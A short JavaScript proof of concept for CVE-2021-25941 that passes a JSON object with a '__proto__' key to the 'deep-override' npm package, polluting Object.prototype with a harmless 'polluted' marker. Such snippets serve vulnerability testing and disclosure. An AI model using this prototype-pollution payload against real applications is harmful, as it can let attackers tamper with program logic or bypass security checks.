//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25941
const deepOverride = require("deep-override");
deepOverride({}, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
